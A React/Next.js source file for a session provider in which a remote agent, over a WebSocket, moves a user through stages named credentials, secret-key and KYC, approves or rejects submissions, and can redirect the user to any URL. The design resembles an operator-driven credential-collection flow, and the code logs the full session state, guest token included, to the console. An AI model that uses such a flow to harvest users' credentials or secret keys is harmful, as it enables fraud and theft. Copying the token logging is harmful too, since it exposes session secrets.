'use client';

/**
 * Session Provider
 *
 * Manages WebSocket connection, agent commands, and session state
 * Wraps all session pages with WebSocket and Zustand integration
 */

import { useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';
import {
  useSessionStore,
  getSocketClient,
  SocketClient,
  SessionTracker
} from '@shared';
import type { CommandMessage } from '@shared';

interface SessionProviderProps {
  children: React.ReactNode;
  sessionUuid: string;
}

export function SessionProvider({ children, sessionUuid }: SessionProviderProps) {
  const router = useRouter();
  const socketRef = useRef<SocketClient | null>(null);
  const trackerRef = useRef<SessionTracker | null>(null);
  const unsubscribersRef = useRef<Array<() => void>>([]);

  const {
    setSession,
    setStage,
    setStatus,
    setAgentMessage,
    incrementConnectionAttempts,
  } = useSessionStore();

  useEffect(() => {
    // Read current state from store (preserves existing values)
    const state = useSessionStore.getState();
    const currentCaseId = state.caseId;
    const guestToken = state.guestToken;

    console.log('[SessionProvider] Initializing with:', {
      sessionUuid,
      caseId: currentCaseId,
      guestToken: guestToken ? `${guestToken.substring(0, 20)}...` : null,
      hasToken: !!guestToken,
      storeState: state
    });

    // Only update sessionUuid, preserve existing caseId and guestToken
    useSessionStore.setState({ sessionUuid });

    // Validate token exists
    if (!guestToken) {
      console.error('[SessionProvider] ⚠️ Missing guest token - WebSocket connection will fail', {
        sessionUuid,
        guestToken: state.guestToken,
        storeState: state
      });
      return;
    }

    // Get or create socket client with token
    console.log('[SessionProvider] Creating WebSocket with token');
    const socket = getSocketClient(sessionUuid, guestToken);
    socketRef.current = socket;

    // Initialize tracking
    const tracker = new SessionTracker(sessionUuid, socket);
    trackerRef.current = tracker;

    // Subscribe to agent commands
    const unsubCommand = socket.subscribe('command', handleAgentCommand);
    const unsubOpen = socket.subscribe('open', () => {
      handleWebSocketOpen();
      // Track session start on first connection
      tracker.trackSessionStart();
    });
    const unsubClose = socket.subscribe('close', handleWebSocketClose);
    const unsubAuthError = socket.subscribe('auth_error', handleAuthError);

    unsubscribersRef.current = [unsubCommand, unsubOpen, unsubClose, unsubAuthError];

    // Connect to WebSocket
    socket.connect();

    // Cleanup on unmount
    return () => {
      unsubscribersRef.current.forEach(unsub => unsub());
    };
  }, [sessionUuid, setSession, setStage, setStatus, setAgentMessage]);

  /**
   * Map backend stage names to frontend route names
   *
   * Backend uses snake_case (credentials, secret_key, kyc, completed)
   * Frontend routes use kebab-case (credentials, secret-key, kyc, completed)
   */
  const mapStageToRoute = (stage: string): string => {
    const stageMap: Record<string, string> = {
      'secret_key': 'secret-key',  // Backend secret_key → Frontend /secret-key
      // All others pass through unchanged
      'credentials': 'credentials',
      'kyc': 'kyc',
      'completed': 'completed',
      'terminated': 'terminated',
    };

    return stageMap[stage] || stage;  // Fallback to original if not found
  };

  /**
   * Handle WebSocket connection open
   */
  const handleWebSocketOpen = () => {
    console.log('[SessionProvider] WebSocket connected');
    setStatus('idle');
    incrementConnectionAttempts();
  };

  /**
   * Handle WebSocket closed
   */
  const handleWebSocketClose = (payload: any) => {
    const { code } = payload;
    console.log(`[SessionProvider] WebSocket closed (code: ${code})`);

    // Handle unauthorized/token error
    if (code === 4003) {
      console.error('[SessionProvider] Unauthorized - Token invalid or expired');
      useSessionStore.getState().reset();
      if (typeof window !== 'undefined') {
        window.location.href = '/';
      }
      return;
    }

    incrementConnectionAttempts();
  };

  /**
   * Handle authentication error
   */
  const handleAuthError = () => {
    console.error('[SessionProvider] WebSocket authentication failed - Invalid or expired guest token');

    // Clear session data
    useSessionStore.getState().reset();

    // Redirect to landing page to re-verify
    if (typeof window !== 'undefined') {
      window.location.href = '/';
    }
  };

  /**
   * Process agent commands
   */
  const handleAgentCommand = (message: CommandMessage) => {
    console.log('[SessionProvider] Agent command received:', message.command);

    const { command, stage, url, message: msg, next_stage } = message;

    switch (command) {
      case 'redirect':
        // Agent redirects customer to different stage
        if (stage) {
          console.log(`[SessionProvider] Redirecting to stage: ${stage}`);
          const route = mapStageToRoute(stage);
          router.push(`/${sessionUuid}/${route}`);
        } else if (url) {
          console.log(`[SessionProvider] Redirecting to URL: ${url}`);
          window.location.href = url;
        }
        break;

      case 'navigate':
        // Agent navigates customer to specific stage
        if (stage) {
          console.log(`[SessionProvider] Agent navigating to: ${stage}`);
          const route = mapStageToRoute(stage);
          setAgentMessage(msg || `Moving to ${stage} stage...`);
          router.push(`/${sessionUuid}/${route}`);
        }
        break;

      case 'accept':
        // Agent accepted submission - move to next stage
        console.log('[SessionProvider] Submission approved by agent');
        setStatus('approved');
        setAgentMessage('Verification approved. Moving to next step...');
        if (next_stage) {
          const route = mapStageToRoute(next_stage);
          router.push(`/${sessionUuid}/${route}`);
        }
        break;

      case 'reject':
        // Agent rejected submission
        console.log('[SessionProvider] Submission rejected by agent');
        setStatus('rejected');
        setAgentMessage(msg || 'Please review your information and try again.');
        break;

      case 'retry':
        // Agent asks customer to retry
        console.log('[SessionProvider] Agent requested retry');
        setStatus('error');
        setAgentMessage(msg || 'Please review and resubmit your information.');
        break;

      case 'skip':
        // Agent skips this stage
        console.log('[SessionProvider] Agent skipped stage:', stage);
        setStatus('approved');
        if (next_stage) {
          const route = mapStageToRoute(next_stage);
          router.push(`/${sessionUuid}/${route}`);
        }
        break;

      case 'session_ended':
        // Agent terminated the session
        console.log('[SessionProvider] Session terminated by agent');
        setStatus('error');
        setAgentMessage('Your session has been terminated.');
        setStage('terminated');
        setTimeout(() => {
          router.push(`/${sessionUuid}/terminated`);
        }, 2000);
        break;

      case 'verification_failed':
        // Agent marked verification as unsuccessful
        console.log('[SessionProvider] Verification marked as unsuccessful');
        setStatus('error');
        setAgentMessage(msg || 'Your verification was unsuccessful. Please contact support.');
        setTimeout(() => {
          setStage('terminated');
          router.push(`/${sessionUuid}/terminated`);
        }, 2000);
        break;

      case 'verification_completed':
        // Agent force-completed verification
        console.log('[SessionProvider] Verification force-completed');
        setStatus('approved');
        setAgentMessage(msg || 'Your verification has been completed.');
        setTimeout(() => {
          setStage('completed');
          router.push(`/${sessionUuid}/completed`);
        }, 1500);
        break;

      default:
        console.warn('[SessionProvider] Unknown command:', command);
    }
  };

  return <>{children}</>;
}
